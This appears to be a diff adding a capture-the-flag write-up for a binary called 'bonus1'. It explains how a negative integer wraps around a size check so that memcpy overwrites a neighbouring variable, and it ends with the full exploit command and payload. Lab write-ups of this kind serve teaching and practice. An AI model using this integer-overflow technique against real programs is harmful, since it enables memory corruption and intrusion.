@@ -1,0 +1,36 @@
+Integer underflow
+
+The program check if we pass something > 9 it exit
+
+We can pass a negative which will overflow and become a positive value
+
+
+How it is working ?
+Imagine we got the maximum negative value for a 32 bits machine
+
+-2147483648
+1000 0000 0000 0000 0000 0000 0000 0000
+
+If we add the same value twice it will overflow and get ride of the bits for
+negative value
+-2147483648 + -2147483648
+1000 0000 0000 0000 0000 0000 0000 0000
++
+1000 0000 0000 0000 0000 0000 0000 0000
+=
+1 0000 0000 0000 0000 0000 0000 0000 0000
+But since we have only 32 bits
+0000 0000 0000 0000 0000 0000 0000 0000
+= 0
+
+If we do the same witt -2147483647, we will get 4 since we're multiplying by 4
+
+place a breakpoint at 
+0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+We need to write atleast 44 bytes, the 4 last bytes will overflow the integer
+variable
+
+0x574f4c46 or FLOW in ascii
+
+./bonus1 "-2147483636" "$(python -c 'print "A" * 40 + "FLOW"')"
